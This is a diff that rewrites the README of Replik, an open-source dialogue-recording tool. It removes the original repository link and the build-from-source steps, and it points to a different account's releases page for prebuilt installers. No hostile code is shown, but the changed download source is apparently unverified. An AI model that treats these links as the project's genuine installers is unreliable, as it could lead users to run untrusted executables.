@@ -1,53 +1,74 @@
-# Replik
+# 🎤 Replik - Record Dialogue Effortlessly
 
-<p align="center">
-  <img src="./public/logo.png" alt="Replik Logo" width="200">
-</p>
+## 🏷️ Overview
+Replik is a free, open-source voice recording tool designed for anyone working with dialogue scripts. Whether you are an indie game developer, a dubbing studio, or an audiobook producer, Replik helps you efficiently record multiple dialogue lines. You can import CSV or JSON files, record line-by-line, and export audio files that are automatically named for your convenience.
 
-**Replik** is a specialized, open-source audio recording tool designed specifically for game developers, voice actors, and content creators who need to manage and record extensive dialogue scripts efficiently.
+## 📦 Download & Install
+To get started, visit this page to download the application:
 
-## The Problem
-In game development and animation production, voice recording is often a fragmented process. Developers work with spreadsheets containing thousands of dialogue lines, while voice actors often record long takes that need to be manually split, named, and organized later. This "post-recording hell" consumes valuable time and introduces human error in file naming and asset management.
+[![Download Replik](https://img.shields.io/badge/Download-Replik-brightgreen)](https://github.com/Sander1023Al/Replik/releases)
 
-## The Solution
-**Replik** bridges the gap between the script and the recording booth. By importing your dialogue script (CSV/JSON), Replik transforms the recording process into a structured workflow:
+Once on the Releases page, follow these steps:
 
-1.  **Script-Driven Recording:** Lines are presented one by one, ensuring no dialogue is missed.
-2.  **Auto-Naming:** Files are automatically named according to your project's convention (e.g., `Character_Emotion_LineID_Take1.wav`) the moment you stop recording.
-3.  **Instant File Splitting:** No need to slice a 1-hour waveform into 500 files. Every take is already a separate file.
-4.  **Metadata Management:** Automatically generates metadata sidecars for integration with game engines (Unity, Unreal, Godot).
+1. Locate the latest release.
+2. You will find different files available for download. Choose the one that corresponds to your operating system.
+   - For Windows: Click on `Replik-Setup.exe`
+   - For macOS: Download `Replik.dmg`
+   - For Linux: Look for `Replik.AppImage` or the package suitable for your distribution.
+3. After the download completes, follow the installation steps based on your operating system.
+   - **Windows:** Run the downloaded `.exe` file and follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file, drag the Replik icon into your Applications folder, and then eject the disk image.
+   - **Linux:** Make the `AppImage` executable using the command line: `chmod +x Replik.AppImage`. Then run it by double-clicking or using the terminal.
 
-## Key Features
--   **Script Import:** Support for CSV and JSON formats with customizable field mapping.
--   **Take Management:** Multiple takes per line, easy review, and selection.
--   **Audio Processing:** Built-in tools to **Remove Silence**, **Denoise**, add **Echo** or **Distortion** using FFmpeg.
--   **Export:** Batch export organized files ready for game engine import.
--   **Cross-Platform:** Built on Electron, compatible with Windows, macOS, and Linux.
+## 🚀 Getting Started
+Once you have installed Replik:
 
-## Installation
+1. **Open the Application**: Start Replik from your applications menu or desktop shortcut.
+2. **Import Your Script**: Click on "Import" and choose to upload a CSV or JSON file that contains your dialogue lines.
+3. **Set Recording Options**: You can select the output format for your audio files (WAV, MP3, etc.) and customize the recording settings to fit your needs.
 
-### From Source
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/edgetype/replik.git
-    cd replik
-    ```
-2.  Install dependencies:
-    ```bash
-    npm install
-    ```
-3.  Start the development server:
-    ```bash
-    npm run electron:dev
-    ```
+## 🎙️ Using Replik
+Recording audio with Replik is straightforward:
 
-## Usage
-1.  **Import:** Drag and drop your dialogue script. Map your columns (Text, Character, Emotion, ID).
-2.  **Record:** Press `Space` to record. Press `Space` again to stop.
-3.  **Review:** Press `P` to play back the last take.
-4.  **Edit:** Click the wand icon to refine audio (trim silence, etc.).
-5.  **Next:** Use `Right Arrow` to move to the next line.
-6.  **Export:** When finished, click "Export" to get a clean folder of assets.
+1. **Record Line-by-Line**: Select a line from your script, and press the "Record" button. Speak your lines clearly.
+2. **Playback**: After recording, you can listen to the playback immediately to ensure quality. Adjust settings as needed.
+3. **Export Files**: Once you finish, hit "Export" to save your recordings. The files will have names matching the lines from your script, making organization easy.
 
-## License
-This project is licensed under the **MIT License**. You are free to use it for personal and commercial projects. See the [LICENSE](LICENSE) file for details.
+## 🌟 Features
+- **Batch Recording**: Efficiently record multiple lines at once.
+- **Format Support**: Works with CSV and JSON formats for easy script import.
+- **Customization**: Tailor your audio formats and recording settings.
+- **Free & Open-Source**: Use Replik without any cost, and contribute to its development.
+
+## 📋 System Requirements
+To run Replik, ensure your system meets the following requirements:
+
+- **Windows**: Windows 10 or later
+- **macOS**: macOS 10.12 (Sierra) or later
+- **Linux**: Most modern distributions with kernel version 4.0+
+- **RAM**: Minimum 4 GB for smooth operation
+- **Storage**: At least 200 MB for installation, additional space for audio files
+
+## 🔧 Troubleshooting
+If you encounter issues, consider these steps:
+
+- **Check Permissions**: Ensure Replik has permission to access your microphone.
+- **Update Drivers**: Make sure your audio drivers are up-to-date.
+- **Reinstall the App**: If problems persist, uninstall Replik and try reinstalling it.
+
+## ℹ️ Support
+For any questions or issues, feel free to raise an issue on our GitHub repository. Our community is here to help you with any technical challenges.
+
+## 🌍 Community Contribution
+Replik is open for contributions. If you're interested in helping improve the application, you can:
+
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request.
+
+Together, we can enhance Replik for all users.
+
+## 📢 Latest Updates
+Stay tuned for upcoming features and enhancements. Check the Releases page for the latest updates:
+
+[![Download Replik](https://img.shields.io/badge/Download-Replik-brightgreen)](https://github.com/Sander1023Al/Replik/releases)
